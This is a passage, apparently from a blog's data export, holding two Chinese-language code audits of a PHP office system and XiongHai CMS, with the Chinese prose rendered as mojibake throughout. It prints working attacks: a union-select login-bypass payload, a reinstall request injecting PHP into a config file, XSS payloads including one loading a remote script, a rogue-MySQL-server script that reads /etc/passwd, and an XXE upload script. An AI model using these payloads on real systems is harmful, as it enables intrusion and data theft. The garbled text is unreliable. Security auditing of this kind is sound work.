¹ç›®å½•ä¸‹çš„å­ç›®å½•åç§°ï¼Œmå¯¹åº”æ¨¡å—åç§°å…¶å®å°±æ˜¯ä¸‹ä¸€çº§ç›®å½•ä»¥åŠé€šè¿‡då†³å®šäº†å¼•å…¥çš„ç±»ï¼ˆç›®å½•ä¸Action.phpåŒåï¼‰ï¼Œä»¥åŠaå‚æ•°å†³å®šæ‰§è¡Œå“ªä¸ªæ–¹æ³•ï¼ŒåŒæ ·å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯ä»¥é…åˆç›®å½•ç©¿è¶Šå¼•å…¥å…¶ä»–çš„ç±»ï¼Œå¯æƒœä¸èƒ½æ§åˆ¶å‰ç¼€ï¼Œä¸ç„¶ä½ç‰ˆæœ¬æˆ‘ä»¬å¯ä»¥é…åˆzipæˆ–è€…phar(php&gt;5.3.0),payloadåƒä¸‹é¢è¿™æ · 12zip:///var/www/html/info.zip%23info.phpphar:///var/www/html/info.zip/info.php æ¥ä¸‹æ¥å…¶å®è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„å‚æ•°ajaxboolä¹Ÿæ˜¯getè¯·æ±‚ä¼ å…¥ï¼Œå¦‚æœä¸ºtrueåˆ™å›å»è®¿é—®å¯¹åº”ç±»æ–¹æ³•å½“ä¸­çš„Ajaxæ–¹æ³•ï¼Œå¦‚æœä¸æ˜¯åˆ™è®¿é—®å¯¹åº”ç±»æ–¹æ³•çš„Actionæ–¹æ³•ï¼Œå¹¶æ¸²æŸ“tplæ¨¡æ¿ å‰å°ç”±äºæ˜¯ä¸ªOAï¼Œå› æ­¤å…¶å®å‰å°åŠŸèƒ½ä¸å¤šæ¯”å¦‚ç™»é™†ã€å®‰è£…ç­‰åŸºæœ¬ä¸Šå°±æ— äº†ä¸åƒæˆ‘ä»¬çš„å†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œè¿™ä¸ªæ›´åå‘äºåŠå…¬ ç™»é™†é¡µSQLæ³¨å…¥è¿™é‡Œç®€å•æµ‹è¯•ä¸‡èƒ½å¯†ç å°±è¡Œäº†ï¼Œå…¶ä»–çš„ç›²æ³¨ä¹‹ç±»çš„åŸç†å·®ä¸å¤šï¼Œå¯ä»¥çœ‹è§è¿™é‡Œç›´æ¥å¯¹å‚æ•°è¿›è¡Œæ‹¼æ¥å› æ­¤æœ‰sqlæ³¨å…¥çš„é£é™©ï¼Œè¿™é‡Œçš„é€»è¾‘æ˜¯å…ˆåœ¨æ•°æ®åº“å½“ä¸­æŸ¥å‡ºä¸€æ¡æ•°æ®ï¼Œå†æ‹¿å‡ºå¯†ç å»æ¯”å¯¹ ç®€å•æµ‹è¯•ä¸‡èƒ½å¯†ç ï¼Œå…¶ä»–çš„æ³¨å…¥è„±è£¤å•¥çš„å°±ä¸æµ‹äº†ï¼Œæ²¡å¿…è¦ï¼Œä¸»è¦æ˜¯è¿™é‡Œæ˜¯ç›²æ³¨æˆ‘æ‡’å¾—å»å†™è„šæœ¬ ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬çœ‹è¿›å…¥äº†åå°ä»¥åå‘ç°ä¸æ˜¯adminï¼Œå†å›åˆ°ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œå…¶å®æ˜¯idæ§åˆ¶çš„ï¼Œå› æ­¤æˆ‘ä»¬å°†union ç¬¬äºŒä¸ªå‚æ•°ä¿®æ”¹ä¸ºadminå¯¹åº”çš„idå³å¯ï¼Œè¿™é‡Œé»˜è®¤å®‰è£…çš„æ—¶å€™è®¾ç½®çš„ä¸º1 å› æ­¤ç®€å•ä¿®æ”¹payload 1adminuser=0&#x27; union select &#x27;e10adc3949ba59abbe56e057f20f883e&#x27;,1,3,&#x27;admin&#x27;,5%23&amp;adminpass=123456&amp;rempass=0&amp;button=1&amp;jmpass=false å‰å°RCE/æ–‡ä»¶è¯»å–è¿™ä¸ªç‰ˆæœ¬å¾ˆé€—ï¼Œæœ‰ä¸ªé€»è¾‘æ¼æ´å¯¼è‡´å¯ä»¥é‡è£…å†RCEï¼Œé¦–å…ˆæˆ‘ä»¬çŸ¥é“å¯¹äºAjaxçš„è¯·æ±‚ä¹Ÿå°±æ˜¯è¦æ±‚ajaxboolå‚æ•°ä¸ºtrueï¼Œè€Œå¦‚æœä¸ºtrueåˆ™å¿…é¡»è¦è¿›è¡Œç™»é™†ï¼Œå¯èƒ½æ˜¯å› ä¸ºè¿™äº›è¯·æ±‚éƒ½å±äºåå°åŠŸèƒ½ 12345678if($islogin == 0)&#123; if($ajaxbool == &#x27;true&#x27;)&#123; echo &#x27;sorry! not sign&#x27;; &#125;else&#123; $rock-&gt;location(&#x27;?m=login&#x27;); &#125; exit();&#125; ä½†æ˜¯è¿™é‡Œåˆå¾ˆé€—ï¼Œå’‹è¯´å‘¢ï¼Œæ¥çœ‹çœ‹isloginæ˜¯å¦‚ä½•èµ‹å€¼çš„ï¼Œå› ä¸ºè¿™é‡Œæ˜¯é€»è¾‘æˆ–æ‰€ä»¥åªè¦æ»¡è¶³ä»»æ„æ¡ä»¶å°±èƒ½ç™»é™† 1if($mode==&#x27;login&#x27; || $dir==&#x27;taskrun&#x27; || $mode==&#x27;taskrun&#x27; || $mode==&#x27;install&#x27;)$islogin = 1;//ä¸å¯åˆ é™¤ å› æ­¤æˆ‘ä»¬å®Œå…¨å¯ä»¥æ§åˆ¶m=installè¿›å…¥é‡è£…ï¼Œæœ€æç¬‘çš„æ˜¯è¿™é‡Œä¸åƒå…¶ä»–ç³»ç»Ÿä¼šé¦–å…ˆåˆ¤æ–­æ˜¯å¦å·²å®‰è£…ï¼Œè¿™é‡Œå°±æ˜¯å¯ä»¥éšæ„é‡æ–°å®‰è£…æ— è¯­å­ï¼Œè€Œä¸”æœ€åä»–ä¼šæŠŠé…ç½®ä¿¡æ¯æ‹¼æ¥å†™å…¥ä¸€ä¸ªphpæ–‡ä»¶é€ æˆäº†å‰å°çš„RCE 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;?php class installClassAction extends Action&#123; public function initMysql() &#123; $this-&gt;linkdb = false; &#125; public function defaultAction() &#123; $this-&gt;title = TITLE.&#x27;_å®‰è£…&#x27;; &#125; public function saveAjax() &#123; $host = $this-&gt;post(&#x27;host&#x27;); $user = $this-&gt;post(&#x27;user&#x27;); $pass = $this-&gt;post(&#x27;pass&#x27;); $base = $this-&gt;post(&#x27;base&#x27;); $perfix = $this-&gt;post(&#x27;perfix&#x27;); $title = $this-&gt;post(&#x27;title&#x27;); $qom = $this-&gt;post(&#x27;qom&#x27;); $url = $this-&gt;post(&#x27;url&#x27;); $highpass = $this-&gt;post(&#x27;highpass&#x27;); $msg = &#x27;&#x27;; if($this-&gt;isempt($msg))&#123; @$conn=mysql_connect($host,$user,$pass); $msg = mysql_error(); &#125; if(!$this-&gt;isempt($msg))&#123; $msg = &#x27;æ— æ³•è¿æ¥æ•°æ®åº“å¯†ç /ç”¨æˆ·åæœ‰è¯¯&#x27;; &#125; if($this-&gt;isempt($msg))&#123; @mysql_select_db($base, $conn); $msg = mysql_error(); //æ•°æ®åº“ä¸å­˜åœ¨å°±åˆ›å»º if(!$this-&gt;isempt($msg))&#123; @mysql_query(&quot;CREATE DATABASE `$base` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci&quot;); $msg = mysql_error(); if($this-&gt;isempt($msg))&#123; @mysql_select_db($base, $conn); $msg = mysql_error(); &#125; &#125; if(!$this-&gt;isempt($msg))&#123; $msg = &#x27;&#x27;.$base.&#x27;æ•°æ®åº“åä¸å­˜åœ¨/ä¸èƒ½åˆ›å»º&#x27;; &#125; &#125; if($this-&gt;isempt($msg))&#123; mysql_query(&quot;SET NAMES &#x27;utf8&#x27;&quot;); $dburl = ROOT_PATH.&#x27;/rainrock.sql&#x27;; if(!file_exists($dburl))$msg = &#x27;æ•°æ®åº“sqlæ–‡ä»¶ä¸å­˜åœ¨&#x27;; &#125; if($this-&gt;isempt($msg))&#123; $sqlss = file_get_contents($dburl); $a = explode(&quot;;&quot;, $sqlss); for($i=0; $i&lt;count($a)-1; $i++)&#123; $sql = $a[$i]; $sql = str_replace(&#x27;`rock_&#x27;, &#x27;`&#x27;.$perfix.&#x27;&#x27;, $sql); //å‰ç¼€æ›¿æ¢ $bo = mysql_query($sql, $conn); if(!$bo)&#123; $msg = &#x27;å¯¼å…¥æ–‡ä»¶å¤±è´¥&#x27;; break; &#125; &#125; &#125; if($this-&gt;isempt($msg))&#123; mysql_query(&quot;update `&quot;.$perfix.&quot;option` set `value`=&#x27;$title&#x27; where `num`=&#x27;systemtitle&#x27;&quot;);//ç³»ç»Ÿæ ‡é¢˜ $txt = &quot;&lt;?phpreturn array( &#x27;url&#x27; =&gt; &#x27;$url&#x27;, //ç³»ç»ŸURL &#x27;title&#x27; =&gt; &#x27;$title&#x27;, //ç³»ç»Ÿé»˜è®¤æ ‡é¢˜ &#x27;db_host&#x27; =&gt; &#x27;$host&#x27;, //æ•°æ®åº“åœ°å€ &#x27;db_user&#x27; =&gt; &#x27;$user&#x27;, //ç”¨æˆ·å &#x27;db_pass&#x27; =&gt; &#x27;$pass&#x27;, //å¯†ç  &#x27;db_base&#x27; =&gt; &#x27;$base&#x27;, //æ•°æ®åº“åç§° &#x27;perfix&#x27; =&gt; &#x27;$perfix&#x27;, //è¡¨åå‰ç¼€ &#x27;qom&#x27; =&gt; &#x27;$qom&#x27;, //sessionã€cookieå‰ç¼€ &#x27;highpass&#x27; =&gt; &#x27;$highpass&#x27;, //è¶…çº§ç®¡ç†å‘˜å¯†ç ï¼Œå¯ç”¨äºç™»å½•ä»»ä½•å¸å· &#x27;install&#x27; =&gt; true //å·²å®‰è£…ï¼Œä¸è¦å»æ‰å•Š);&quot;; $this-&gt;rock-&gt;createtxt(&#x27;webrock/webrockConfig.php&#x27;, $txt); &#125; if($this-&gt;isempt($msg))$msg = &#x27;success&#x27;; echo $msg; &#125;&#125; å› æ­¤æœ€ç»ˆå¯ä»¥æ„é€ ï¼Œå‰æè¦æœ‰ä¸ªå¯ä»¥è¿æ¥çš„æœåŠ¡å™¨ä¸ç„¶è¿æ¥ä¸ä¸Šå°±æ— æ³•æ‰§è¡Œåé¢çš„è¯­å¥äº† 123host=xxx:3306&amp;user=admin&amp;pass=admin123&amp;base=ry&amp;perfix=yy_&amp;qom=&#x27;,&quot;123&quot;=&gt;phpinfo(),//http://xxxx/rock.php?a=save&amp;m=install&amp;ajaxbool=true æ¥ä¸‹æ¥åªéœ€è¦è®¿é—®http://xxxx/webrock/webrockConfig.php,å…¶å®é¦–é¡µä¹Ÿè¡Œæ¯•ç«Ÿæ˜¯é…ç½®æ–‡ä»¶è‚¯å®šå…¨å±€å¼•å…¥äº†çš„ å‰å°XSSå› ä¸ºåœ¨è·¯ç”±å‡ºç°æ‰¾ä¸åˆ°ç±»çš„æ—¶å€™ä¼šç›´æ¥echoç»å¯¹è·¯å¾„ç­‰ä¿¡æ¯ï¼Œè¿˜å¯ä»¥ç”¨æˆ·æ§åˆ¶éƒ¨åˆ†å­—ç¬¦é‚£å°±å¾ˆå®¹æ˜“è¿›è¡ŒXSSäº†,è¿™é‡Œä¸ä¸Šä»£ç äº†ä¸Šé¢åˆ†ææ¶æ„çš„æ—¶å€™è¯´è¿‡ 1http://xxxxx/rock.php?a=zz&amp;m=flowz&lt;script&gt;alert(&quot;Hacked By Y4tacker&quot;)&lt;/script&gt;&amp;d=&amp;ajaxbool=true å½“ç„¶è¿˜å¯ä»¥é…åˆrougue mysql serveråšä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº† åå°å‰å°åŠŸèƒ½ä¸å¤šï¼Œé‚£ç°åœ¨è¿›å…¥åå°ï¼Œä¸ªäººä¹Ÿæ˜¯æœ‰æ´ç™–çš„åªå–œæ¬¢å‰å°æ´æˆ–è€…ä¸€æ¡ä»å‰å°åˆ°åå°çš„å®Œæ•´åˆ©ç”¨ ç°åœ¨å‰å°ä¹Ÿå·²ç»æœ‰sqlæ³¨å…¥äº†ï¼Œåå°çš„æ³¨å…¥ä¹Ÿæœ‰å¾ˆå¤š,æ•°ä¸èƒœæ•°ä½†æ˜¯æ²¡å•¥æ„ä¹‰äº†ï¼Œæ¼æ´åŸç†éƒ½æ˜¯ä¸€æ ·çš„æ— è¿‡æ»¤+å‚æ•°æ‹¼æ¥é€ æˆå‘½ä»¤é€ƒé€¸ï¼Œåå°XSSç‚¹ä¹Ÿå¾ˆå¤šä¹Ÿæ˜¯ä¸€æ ·æ²¡æ„ä¹‰äº†,è¿™é‡Œå°±åˆ—ä¸¾ä¸€äº›ä¸ä¸€æ ·çš„ç‚¹ åå°XXEè¿™é‡Œå°±ç®€å•åšä¸ªPOCéªŒè¯å³å¯ï¼Œå¯ä»¥çœ‹åˆ°åœ¨webrock/humanres/kaoqin/kaoqinAction.php çœ‹çœ‹è¿™ä¸ªreaderå…¶å®å°±æ˜¯è§£æExcelçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œè¿™æ—¶å€™ä¸éš¾æƒ³åˆ°å¯èƒ½å­˜åœ¨xxe åœ¨canReadå½“ä¸­ï¼Œå¯ä»¥çœ‹è§é¦–å…ˆå¯¹_rels/.relsåšäº†simplexml_load_stringå¤„ç†ï¼Œå­˜åœ¨xxeï¼Œåé¢æˆ‘ä»¬éƒ½ä¸éœ€è¦ä¼ªé€ å®Œæ•´çš„excelæ ¼å¼çš„æ–‡ä»¶äº† è¿™é‡Œç®€å•æµ‹è¯•ä¸€æ³¢èƒ½æ¥æ”¶åˆ°urlè¯·æ±‚çš„è¿æ¥å°±è¡Œï¼Œä¹‹åé‡å‘½åä¸º.relså³å¯ ç®€å•pythonå‘æ³¢åŒ… 1234567import requestsurl = &quot;http://xxxx/rock.php?a=import&amp;m=kaoqin&amp;d=humanres&amp;ajaxbool=true&quot;r= requests.post(url,files=&#123;&quot;file&quot;:open(&quot;1.zip&quot;,&quot;rb&quot;).read()&#125;)print(r.text)","categories":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Y4æ•™ä½ å®¡è®¡ç³»åˆ—ä¹‹ç†Šæµ·CMSä»£ç å®¡è®¡","slug":"year/2022/6/Y4æ•™ä½ å®¡è®¡ç³»åˆ—ä¹‹ç†Šæµ·CMSä»£ç å®¡è®¡","date":"2022-06-16T01:16:08.000Z","updated":"2024-08-04T09:01:49.463Z","comments":true,"path":"2022/06/16/year/2022/6/Y4æ•™ä½ å®¡è®¡ç³»åˆ—ä¹‹ç†Šæµ·CMSä»£ç å®¡è®¡/","link":"","permalink":"https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"ç†Šæµ·CMSä»£ç å®¡è®¡æ¶æ„å®¡è®¡ä»£ç ä»æ¶æ„å¼€å§‹ï¼Œè¿™ä¸ªCMSæ¶æ„æ¯”è¾ƒç®€å•ï¼Œç®€å•çš„MVCè®¾è®¡æ¨¡å¼ï¼Œæ ¹æ®å‚æ•°rå†³å®šè·¯ç”±çš„åˆ†å‘ï¼Œè¿™ä¸ªè·¯ç”±åˆ†å‘å¯èƒ½å¯¼è‡´ä¸€ä¸ªè‡´å‘½çš„ç¼ºé™·å¯¼è‡´æœ€ç»ˆå®ç°RCE 123456&lt;?phperror_reporting(0); $file=addslashes($_GET[&#x27;r&#x27;]); $action=$file==&#x27;&#x27;?&#x27;index&#x27;:$file; include(&#x27;files/&#x27;.$action.&#x27;.php&#x27;);?&gt; ç”±æ­¤å¯èƒ½å­˜åœ¨çš„å‰å°RCEæˆ‘ä»¬çŸ¥é“ç†Šæµ·å®‰è£…ä¼šå…ˆåˆ¤æ–­åŒæ–‡ä»¶å¤¹ä¸‹æœ‰æ— InstallLock.txtä½œä¸ºæ˜¯å¦å®‰è£…çš„åˆ¤æ–­æ ‡å‡† é‚£å¦‚æœæˆ‘ä»¬é€šè¿‡ä¸Šé¢è¿™ä¸ªè·¯ç”±åˆ†å‘å®ç°ç›®å½•ç©¿è¶Šï¼Œé‚£å½“å‰ç›®å½•ä¹Ÿå°±æ˜¯webç›®å½•ä¸‹çš„index.phpæ˜¯æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶çš„ æ²¡æœ‰å¯¹å‚æ•°åšå¤„ç† 1234567$save=$_POST[&#x27;save&#x27;];$user=$_POST[&#x27;user&#x27;];$password=md5($_POST[&#x27;password&#x27;]);$dbhost=$_POST[&#x27;dbhost&#x27;];$dbuser=$_POST[&#x27;dbuser&#x27;];$dbpwd=$_POST[&#x27;dbpwd&#x27;];$dbname=$_POST[&#x27;dbname&#x27;]; å¯æƒœç”±äºæœ‰ç¬¬ä¸€è¡Œincludeå¤±è´¥å¯¼è‡´ä»£ç ç»ˆæ­¢ï¼Œä¸ç„¶é€šè¿‡è¿™ä¸ªæˆ‘ä»¬ä¸€æ–¹é¢å¯ä»¥å°è¯•fakemysqlè¯»å–ä»»æ„æ–‡ä»¶ï¼Œå¦ä¸€æ–¹é¢å¯ä»¥å®ç°å¾€webç›®å½•ä¸Šä¸€å±‚å†™æ–‡ä»¶ä¹‹åå†åŒ…å«å®ç°RCEï¼Œæœ‰ç‚¹å¯æƒœ æœ‰æ²¡æœ‰è§£å†³çš„åŠæ³•å‘¢ï¼Ÿæœ‰é‚£å°±æ˜¯æ‰¾ä¸€ä¸ªå’Œinstall/index.phpç›¸å¯¹è·¯å¾„ç›¸åŒçš„å¹¶ä¸”å­˜åœ¨å¦‚ä¸Šä»£ç çš„åœ°æ–¹ï¼Œæœ‰ä¹ˆ ç­”æ¡ˆæ˜¯æœ‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ­¤è·¯ç”±æˆåŠŸä¿ç•™installçš„æ‰€æœ‰åŠŸèƒ½ å‰å°é…åˆç›®å½•ç©¿è¶Šè¯»æ–‡ä»¶å¯ä»¥çœ‹è§mysqlæˆåŠŸå»ºç«‹è¿æ¥ ä½†æ˜¯æ¯•ç«Ÿadminç›®å½•ä¸‹æ²¡æœ‰sqlæ–‡ä»¶ï¼Œå¦‚æœèƒ½é…åˆæ–‡ä»¶ä¸Šä¼ ä¹Ÿèƒ½æäº‹æƒ…å¾…ä¼šå„¿ç ”ç©¶ä¸‹ ä¸è¿‡è¿™æ—¶å€™å¯ä»¥åšä¸€ä»¶äº‹æƒ…ï¼Œé€šè¿‡fakemysqlå»è¯»ä»»æ„æ–‡ä»¶äº†ï¼Œä¹Ÿæ˜¯å­˜åœ¨çš„ç‚¹ï¼Œè¿™é‡Œç”±äºphpç‰ˆæœ¬ä¸ä¸€è‡´éœ€è¦æ„é€ ä¸åŒçš„tcpæ•°æ®åŒ…ï¼Œè¿™é‡Œæˆ‘ç”¨äº†githubä¸Šæ‰¾åˆ°çš„ä¸€ä¸ªå’Œæˆ‘php5.2ç‰ˆæœ¬èƒ½ç”¨çš„ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpfunction unhex($str) &#123; return pack(&quot;H*&quot;, preg_replace(&#x27;#[^a-f0-9]+#si&#x27;, &#x27;&#x27;, $str)); &#125;$filename = &quot;/etc/passwd&quot;;$srv = stream_socket_server(&quot;tcp://0.0.0.0:1237&quot;);while (true) &#123; echo &quot;Enter filename to get [$filename] &gt; &quot;; $newFilename = rtrim(fgets(STDIN), &quot;\\r\\n&quot;); if (!empty($newFilename)) &#123; $filename = $newFilename; &#125; echo &quot;[.] Waiting for connection on 0.0.0.0:1237\\n&quot;; $s = stream_socket_accept($srv, -1, $peer); echo &quot;[+] Connection from $peer - greet... &quot;; fwrite($s, unhex(&#x27;45 00 00 00 0a 35 2e 31 2e 36 33 2d 30 75 62 75 6e 74 75 30 2e 31 30 2e 30 34 2e 31 00 26 00 00 00 7a 42 7a 60 51 56 3b 64 00 ff f7 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 64 4c 2f 44 47 77 43 2a 43 56 63 72 00 &#x27;)); fread($s, 8192); echo &quot;auth ok... &quot;; fwrite($s, unhex(&#x27;07 00 00 02 00 00 00 02 00 00 00&#x27;)); fread($s, 8192); echo &quot;some shit ok... &quot;; fwrite($s, unhex(&#x27;07 00 00 01 00 00 00 00 00 00 00&#x27;)); fread($s, 8192); echo &quot;want file... &quot;; fwrite($s, chr(strlen($filename) + 1) . &quot;\\x00\\x00\\x01\\xFB&quot; . $filename); stream_socket_shutdown($s, STREAM_SHUT_WR); echo &quot;\\n&quot;; echo &quot;[+] $filename from $peer:\\n&quot;; $len = fread($s, 4); if(!empty($len)) &#123; list (, $len) = unpack(&quot;V&quot;, $len); $len &amp;= 0xffffff; while ($len &gt; 0) &#123; $chunk = fread($s, $len); $len -= strlen($chunk); echo $chunk; &#125; &#125; echo &quot;\\n\\n&quot;; fclose($s);&#125; ç®€å•æµ‹è¯•ä¸€æ³¢æˆåŠŸè¯»å–åˆ°é…ç½®æ–‡ä»¶ å¯æƒœåå°ä¹Ÿä¸èƒ½ä»»æ„ä¸Šä¼ æ–‡ä»¶åˆ°adminçš„fielsç›®å½•ä¸‹ï¼Œè€Œä¸”config.jsoné…ç½®å½“ä¸­ä¸æ”¯æŒjsonåç¼€ï¼Œå°±åˆ°æ­¤ç»“æŸå§ çœŸæ­£çš„å‰å°RCEå› ä¸ºæ˜¯å®å¡”å®‰è£…çš„ç¼˜æ•…æ‰€ä»¥å¾ˆå®¹æ˜“çŒœæµ‹åˆ°å®å¡”phpçš„å®‰è£…è·¯å¾„/www/server/php/52/ï¼Œè¿™é‡Œä»‹ç»å¦ä¸€ä¸ªtrickçš„ä½¿ç”¨ä¹Ÿå°±æ˜¯pearcmd.phpï¼Œåœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š--with-pearæ‰ä¼šå®‰è£…ã€‚ï¼Œè¿™é‡Œè¿™ä¸ªè€cmsä¸€å®šæ˜¯åªèƒ½5ç‰ˆæœ¬æ‰€ä»¥ä¸€å®šå¯ä»¥ å› æ­¤æ„é€ payloadï¼Œå¾€/tmp/hello.phpå†™æ–‡ä»¶å³å¯ ä¹‹åæ–‡ä»¶åŒ…å«æˆåŠŸRCE é€»è¾‘ç»•è¿‡å…å¯†ç ç™»å…¥åå°-å‚ç›´è¶Šæƒé‰´æƒå‡½æ•°å¾ˆç®€å•ï¼Œæ‰€ä»¥åªè¦è®¾ç½®cookieå½“ä¸­userä¸ºä»»æ„å­—ç¬¦å³å¯è¿›å…¥åå° å‰å°æ—¢ç„¶é»˜è®¤æ˜¯ä»filesæ–‡ä»¶å¤¹ä¸‹åšä¸ºè·¯ç”±çš„ä¸»æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸å¦¨å…ˆä»filesæ–‡ä»¶å¤¹å¼€å§‹ï¼Œæ–‡ä»¶ä¹Ÿä¸å¤šï¼Œåœ¨æ¯ä¸ªæ–‡ä»¶å½“ä¸­å…ˆåšäº†ä¸€ä»¶äº‹æƒ…ï¼Œè¿™éƒ¨åˆ†æ²¡å•¥æ¼æ´ï¼Œræœ¬æ¥å°±æ˜¯å†³å®šè·¯ç”±åˆ†å‘çš„ï¼Œè€Œä¸”æœ‰addslashesæ— æ³•é€ƒé€¸å•å¼•å·ï¼Œé™¤éèƒ½æ§åˆ¶æ•°æ®åº“å†…å®¹å¯ä»¥å½¢æˆxss 1234567891011&lt;?php require &#x27;inc/conn.php&#x27;;require &#x27;inc/time.class.php&#x27;;$query = &quot;SELECT * FROM settings&quot;;$resul = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error());$info = mysql_fetch_array($resul);$llink=addslashes($_GET[&#x27;r&#x27;]);$query = &quot;SELECT * FROM nav WHERE link=&#x27;$llink&#x27;&quot;;$resul = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error());$navs = mysql_fetch_array($resul);?&gt; å‰å°XSS1+çªç ´addslasheså­—ç¬¦é™åˆ¶åœ¨contact.phpå½“ä¸­ï¼Œæ¥æ”¶åˆ°pageå‚æ•°å¹¶å›æ˜¾ï¼Œ 123456$page=addslashes($_GET[&#x27;page&#x27;]);if ($page&lt;&gt;&quot;&quot;)&#123;if ($page&lt;&gt;1)&#123;$pages=&quot;ç¬¬&quot;.$page.&quot;é¡µ - &quot;;&#125;&#125; å› æ­¤å¯ä»¥é€šè¿‡payload 11&lt;/a&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;a&gt; ä½†æ˜¯è¿™é‡Œåˆæœ‰äº†ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œaddslasheså¯¼è‡´æˆ‘ä»¬ä¸èƒ½å¸¦å¼•å·ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿä¸‹é¢ç»™ä¸€ä¸ªè§£å†³æ–¹å¼ï¼Œå¾ˆç®€å•å°±ä¸å¤šè¯´å•¦ï¼Œè¿™é‡Œsrcå¯ä»¥ä¸åŠ å¼•å· 1r=contact&amp;page=2333&lt;/a&gt;&lt;script src=http://xxxx/1.js&gt;&lt;/script&gt;&lt;a&gt; åˆæˆ–è€… 1r=contact&amp;page=2333&lt;/a&gt;&lt;script&gt;alert(/Hacked By y4tacker/)&lt;/script&gt;&lt;a&gt; å‰å°XSS2åœ¨contenté¡µé¢ï¼Œidå¯æ§åˆ¶cookieä¹Ÿå¯æ§åˆ¶ä¸æ¼”ç¤ºäº†ï¼Œæ‡‚å¾—éƒ½æ‡‚ å‰å°XSS3-åŒæ ·ä¾‹å­å¤ªå¤šå°±ä¸åˆ—ä¸¾äº†è¿™ä¸ªæ›´ç¦»è°±ï¼Œæ— è¿‡æ»¤åé¢è¿˜æœ‰è¾“å‡ºyemaå‚æ•°åŒæ ·ä¸æ¼”ç¤ºäº†ï¼Œæ²¡æ„ä¹‰ï¼ŒåŒæ ·çš„ä¾‹å­å¾ˆå¤š å‰å°SQLæ³¨å…¥ content/softwareä¸¤ä¸ªé¡µé¢åŒç†ç”±äºæœ‰addslashesï¼Œé€ æˆä¸éš¾é€ƒé€¸å¼•å· 123456789101112131415161718192021&lt;?php require &#x27;inc/conn.php&#x27;;require &#x27;inc/time.class.php&#x27;;$query = &quot;SELECT * FROM settings&quot;;$resul = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error());$info = mysql_fetch_array($resul);$id=addslashes($_GET[&#x27;cid&#x27;]);$query = &quot;SELECT * FROM content WHERE id=&#x27;$id&#x27;&quot;;$resul = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error());$content = mysql_fetch_array($resul);$navid=$content[&#x27;navclass&#x27;];$query = &quot;SELECT * FROM navclass WHERE id=&#x27;$navid&#x27;&quot;;$resul = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error());$navs = mysql_fetch_array($resul);//æµè§ˆè®¡æ•°$query = &quot;UPDATE content SET hit = hit+1 WHERE id=$id&quot;;@mysql_query($query) or die(&#x27;ä¿®æ”¹é”™è¯¯ï¼š&#x27;.mysql_error());?&gt; é€ æˆupdateè¯­å¥å¤„çš„æ³¨å…¥ï¼Œå½“ç„¶è¿™é‡Œ@mysql_query($query) or die(&#39;ä¿®æ”¹é”™è¯¯ï¼š&#39;.mysql_error());ä¼šè¾“å‡ºé”™è¯¯ï¼Œæ‰€ä»¥æŠ¥é”™æ³¨å…¥å°±å®Œäº‹å•¦ æœ‰äº†sqlæ³¨å…¥ï¼Œæˆ‘ä»¬å°±èƒ½å°è¯•æ‹¿åˆ°ç®¡ç†ç”¨æˆ·å¯†ç ï¼Œåœ¨æœ€ä¸Šé¢æˆ‘ä»¬è¯´äº†å¯†ç åªæ˜¯ç®€å•md5æ‰€ä»¥å¯èƒ½é€ æˆæ’åº“è·å–æ˜æ–‡çš„é£é™© éªŒè¯ç é€»è¾‘é—®é¢˜å¯ä»¥çœ‹åˆ°è¿™é‡ŒéªŒè¯ç å¼•å…¥code.class.php è€Œè¿™ä¸ªæ–‡ä»¶ç›´æ¥æŠŠéªŒè¯ç æ”¾å…¥sessionï¼Œè¿™é‡Œè¿˜æ²¡å•¥é—®é¢˜ è¿™é‡Œåªæ˜¯éªŒè¯æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´ä¹Ÿä¸ä¼šåˆ·æ–°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªéªŒè¯ç æ¥ä¸€ç›´å®ç°çˆ†ç ´éœ€è¦éªŒè¯ç çš„é¡µé¢å¦‚ç™»é™†ç­‰ç­‰ 